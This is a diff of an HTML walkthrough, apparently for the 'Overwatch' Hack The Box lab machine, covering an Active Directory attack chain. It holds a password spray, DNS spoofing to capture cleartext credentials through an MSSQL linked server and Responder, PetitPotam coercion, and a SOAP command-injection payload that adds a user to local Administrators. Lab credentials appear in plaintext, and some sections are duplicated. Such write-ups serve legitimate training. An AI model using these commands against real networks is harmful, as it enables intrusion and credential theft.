@@ -29,11 +29,22 @@
             <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
 
             <h2>Overview</h2>
-            <p>Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service.</p>
+            <p>Overwatch is a Windows Active Directory machine that chains together several attack techniques: SMB enumeration leading to credential discovery in a .NET binary, SQL linked-server abuse to capture cleartext credentials via Responder, a foothold via WinRM, and finally privilege escalation through a vulnerable WCF SOAP service running as SYSTEM.</p>
 
             <h2>Reconnaissance</h2>
             <h3>Nmap</h3>
             <pre><code>nmap -sV 10.129.16.26 -vvv</code></pre>
+            <pre><code>PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  tcpwrapped    syn-ack ttl 127
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: overwatch.htb)
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</code></pre>
+
+            <h3>LDAP Check</h3>
+            <pre><code>ldapsearch -x -H ldap://10.129.16.26 -b "dc=overwatch,dc=htb"</code></pre>
+            <p>Result: <code>Operations error: In order to perform this operation a successful bind must be completed.</code> This confirms anonymous LDAP binds are disabled.</p>
             <p>Key open ports identified during scanning:</p>
             <table>
                 <thead><tr><th>Port</th><th>Service</th></tr></thead>
@@ -47,12 +58,14 @@
                     <tr><td>3389</td><td>RDP</td></tr>
                 </tbody>
             </table>
-            <p>The LDAP banner reveals the domain: <code>overwatch.htb</code> and host: <code>S200401</code>. Update your <code>/etc/hosts</code>:</p>
+            <p>The LDAP banner reveals the domain: <strong>overwatch.htb</strong> / host: <strong>S200401</strong>. Add to <code>/etc/hosts</code>:</p>
             <pre><code>10.129.16.26 overwatch.htb</code></pre>
 
             <h2>Enumeration</h2>
             <h3>SMB — Anonymous Access</h3>
             <pre><code>crackmapexec smb 10.129.16.26 -u guest -p '' --shares</code></pre>
+            <p>Accessible shares:</p>
+            <ul><li><code>IPC$</code> — READ</li><li><code>software$</code> — READ ✅</li></ul>
             <p>Accessible shares found: <code>IPC$</code> (READ) and <code>software$</code> (READ ✅).</p>
 
             <h3>Exploring the software$ Share</h3>
@@ -70,51 +83,78 @@ get overwatch.pdb</code></pre>
             <p>Running <code>strings</code> against <code>overwatch.exe</code> reveals a hardcoded SQL connection string:</p>
             <pre><code>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</code></pre>
 
+            <h3>Hardcoded Credentials Discovery</h3>
+            <p>Running <code>strings</code> against <code>overwatch.exe</code> reveals the SQL connection string:</p>
+            <pre><code>Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;</code></pre>
+
+            <h3>User Enumeration & SID Lookup</h3>
+            <pre><code>impacket-lookupsid 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.16.26'</code></pre>
+            <p>Revealed users: <code>sqlsvc</code> (RID 1104), <code>sqlmgmt</code> (RID 1105).</p>
+
             <h3>User Enumeration & Spray</h3>
             <pre><code>./kerbrute userenum --dc 10.129.16.26 -d overwatch.htb users.txt</code></pre>
-            <p>Discovered valid users: <code>guest</code>, <code>administrator</code>, <code>sqlsvc</code>, <code>S200401</code>. A password spray confirms the following credentials:</p>
+            <p>Valid usernames discovered: <code>guest</code>, <code>administrator</code>, <code>sqlsvc</code>, <code>S200401</code>.</p>
+            <pre><code>crackmapexec smb 10.129.16.26 -u users.txt -p 'Overwatch2026!,Sql2026!,Welcome1,Password123'</code></pre>
+            <p>Confirmed credentials:</p>
             <ul>
-                <li><strong>sqlsvc : TI0LKcfHzZw1Vv</strong></li>
+                <li><strong>sqlsvc : TI0LKcfHzZw1Vv</strong> ✅</li>
                 <li><strong>svc_monitor : Overwatch2026!</strong></li>
             </ul>
 
-            <h2>Lateral Movement — MSSQL Linked Server</h2>
-            <p>Connecting to MSSQL as <code>sqlsvc</code>, we find a linked server named <strong>SQL07</strong>. By querying it while spoofing DNS to point <code>SQL07</code> to our Kali IP, we capture credentials via <strong>Responder</strong>:</p>
+            <h2>Lateral Movement — Linked Server Credential Capture</h2>
+            <p>BloodHound reveals <strong>S200401 (DC)</strong> has <strong>Unconstrained Delegation</strong> enabled. We use <code>dnstool.py</code> to add a malicious DNS record pointing <code>SQL07</code> to our Kali IP:</p>
+            <pre><code>python3 dnstool.py -u 'overwatch.htb\sqlsvc' -p 'TI0LKcfHzZw1Vv' -dns-ip 10.129.17.170 --zone overwatch.htb -r SQL07 -a add -t A -d &lt;KALI_IP&gt; 10.129.17.170</code></pre>
+            <p>Now we connect to MSSQL as <code>sqlsvc</code> and trigger a query to the linked server:</p>
+            <pre><code>impacket-mssqlclient -windows-auth -port 6520 \
+  'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@10.129.17.170'</code></pre>
             <pre><code>EXEC('SELECT * FROM OPENQUERY(SQL07, ''SELECT 1'')');</code></pre>
-            <pre><code>[MSSQL] Cleartext Username : sqlmgmt
+            <pre><code>[MSSQL] Received connection from 10.129.17.170
+[MSSQL] Cleartext Username : sqlmgmt
 [MSSQL] Cleartext Password : bIhBbzMMnB82yx</code></pre>
+
+            <h2>Bonus: PetitPotam (Machine Hash)</h2>
+            <p>Coerce DC machine account authentication to our listener:</p>
+            <pre><code>python3 PetitPotam.py -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb &lt;KALI_IP&gt; 10.129.17.170</code></pre>
+            <p>Responder captures the NTLMv2 hash for <code>OVERWATCH\S200401$</code>.</p>
 
             <h2>Initial Foothold — WinRM</h2>
             <pre><code>evil-winrm -i 10.129.17.170 -u sqlmgmt -p 'bIhBbzMMnB82yx'</code></pre>
-            <p>🚩 <strong>User flag captured:</strong> <code>f1bace098dfaaeebb7d56bd1243a5b83</code></p>
-
-            <h2>Bonus: PetitPotam (Machine Hash)</h2>
-            <p>BloodHound reveals the DC has <strong>Unconstrained Delegation</strong>. Using PetitPotam to coerce authentication to our listener captures the machine account hash (<code>S200401$</code>), enabling further escalation paths.</p>
+            <pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop&gt; cat user.txt</code></pre>
+            <pre><code>*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop&gt; cat user.txt</code></pre>
+            <p>🚩 <strong>User flag captured.</strong></p>
 
             <h2>Privilege Escalation — WCF SOAP Injection</h2>
-            <p>The WCF service exposes a <code>KillProcess</code> method vulnerable to command injection. We send a crafted SOAP request from our WinRM session to escalate to Local Admin:</p>
+            <p>The WCF service exposes a <code>KillProcess</code> method. We send a crafted SOAP request from our WinRM session to add <code>sqlmgmt</code> to the local Administrators group:</p>
             <pre><code># SOAP Injection Payload
 iwr http://overwatch.htb:8000/MonitorService `
-  -Method POST `
+  -UseBasicParsing -Method POST `
   -Headers @{
     "Content-Type"  = "text/xml; charset=utf-8"
     "SOAPAction"    = '"http://tempuri.org/IMonitoringService/KillProcess"'
   } `
   -Body "&lt;s:Envelope xmlns:s='http://schemas.xmlsoap.org/soap/envelope/'&gt;
-    &lt;s:Body&gt;
-      &lt;KillProcess xmlns='http://tempuri.org/'&gt;
-        &lt;processName&gt;notepad; net localgroup Administrators sqlmgmt /add&lt;/processName&gt;
-      &lt;/KillProcess&gt;
-    &lt;/s:Body&gt;
-  &lt;/s:Envelope&gt;"</code></pre>
-            <p>Verify success: <code>net localgroup Administrators</code>. From here, a new session as Admin provides the root flag.</p>
+  &lt;s:Body&gt;
+    &lt;KillProcess xmlns='http://tempuri.org/'&gt;
+      &lt;processName&gt;notepad; net localgroup Administrators sqlmgmt /add&lt;/processName&gt;
+    &lt;/KillProcess&gt;
+  &lt;/s:Body&gt;
+&lt;/s:Envelope&gt;"</code></pre>
+            <p>Verifying the result:</p>
+            <pre><code>net localgroup Administrators</code></pre>
+            <pre><code>Members
+-------
+Administrator
+Domain Admins
+Enterprise Admins
+sqlmgmt          ✅</code></pre>
+            <p><code>sqlmgmt</code> is now a local Administrator. From here, a new Evil-WinRM session gives full access to the Administrator's desktop and the root flag.</p>
 
             <h2>Attack Chain Summary</h2>
-            <pre><code>SMB Discovery → WCF Config → SQL Creds → SQL Linked Server → Responder → WinRM → WCF Injection → SYSTEM</code></pre>
+            <pre><code>SMB anonymous access → WCF config → SQL connection string → sqlsvc creds → MSSQL linked server (SQL07) + DNS spoof + Responder → Cleartext creds: sqlmgmt → WinRM foothold → user.txt → WCF SOAP injection (KillProcess) → Local Admin → root.txt</code></pre>
 
             <h2>Tools Used</h2>
             <div class="hero-meta" style="background: none; border: none; padding: 0;">
-                <code>nmap</code> <code>crackmapexec</code> <code>kerbrute</code> <code>impacket</code> <code>BloodHound</code> <code>evil-winrm</code> <code>responder</code> <code>PetitPotam</code>
+                <code>nmap</code> <code>crackmapexec</code> <code>kerbrute</code> <code>smbclient</code> <code>impacket</code> <code>BloodHound</code> <code>evil-winrm</code> <code>responder</code> <code>PetitPotam</code> <code>dnstool.py</code> <code>strings</code>
             </div>
 
             <div style="margin-top: 50px;">
